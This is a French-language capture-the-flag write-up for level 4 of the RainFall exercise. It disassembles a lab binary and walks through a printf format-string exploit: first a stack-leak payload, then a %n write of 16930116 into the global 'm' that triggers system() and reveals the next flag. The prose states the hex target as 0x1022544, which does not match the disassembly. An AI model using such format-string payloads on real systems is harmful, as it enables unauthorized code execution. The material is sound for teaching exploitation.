# Level 4

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:	push   ebp
   0x080484a8 <+1>:	mov    ebp,esp
   0x080484aa <+3>:	and    esp,0xfffffff0
   0x080484ad <+6>:	call   0x8048457 <n>
   0x080484b2 <+11>:	leave  
   0x080484b3 <+12>:	ret    
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   ebp
   0x08048458 <+1>:	mov    ebp,esp
   0x0804845a <+3>:	sub    esp,0x218
   0x08048460 <+9>:	mov    eax,ds:0x8049804
   0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x08048471 <+26>:	lea    eax,[ebp-0x208]
   0x08048477 <+32>:	mov    DWORD PTR [esp],eax
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    eax,[ebp-0x208]
   0x08048485 <+46>:	mov    DWORD PTR [esp],eax
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    eax,ds:0x8049810
   0x08048492 <+59>:	cmp    eax,0x1025544
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave  
   0x080484a6 <+79>:	ret    
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18
   0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x0804844d <+9>:	mov    DWORD PTR [esp],eax
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave  
   0x08048456 <+18>:	ret    
End of assembler dump.
```

```bash
level4@RainFall:~$ objdump -t level4 

level4:     file format elf32-i386

SYMBOL TABLE:
...
08049810 g     O .bss	00000004              m
...
```

Ce niveau ressemblant au precedent a l'exception que cette fois ci nous devons ecrire la valeur `0x1022544` (`16930116` en decimal) pour avoir acces directement a l'execution de `system` qui nous affichera le flag du niveau suivant

Nous devons d'abord trouver l'offset pour atteindre notre buffer qui se trouve a la 12eme position
```bash
level4@RainFall:~$ ./level4 <<< $(python -c 'print "AAAA" + "%x " * 20')
AAAAb7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078
```

La particularite de ce niveau c'est que nous devons faire croire à printf qu’il a imprime `16930116` caracteres pour valider la condition sauf que nous avons un buffer de 520 octets et une utilisation de `fgets`

Pour contourner ce probleme nous allons utiliser les format specifiers de printf pour rajouter un padding (utilisant un whitespace) avec cette syntaxe `%<nbytes>x` qui seront imprimer directement dans la sortie standard plutot que stocker dans le buffer et incrementant le compteur interne de printf pour ensuite ecrire cette valeur dans l'adresse de la variable globale `m`

Les 4 premiers octets correspondant à l’adresse de m sont deja imprimes, il faut donc soustraire 4 au padding pour atteindre exactement 16930116

Le `$` permet d’acceder directement au 12eme argument de printf sans consommer les arguments precedents ce qui rend l’exploit stable et evite de perturber le padding

```bash
level4@RainFall:~$ (python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"') | ./level4
******************************************************
```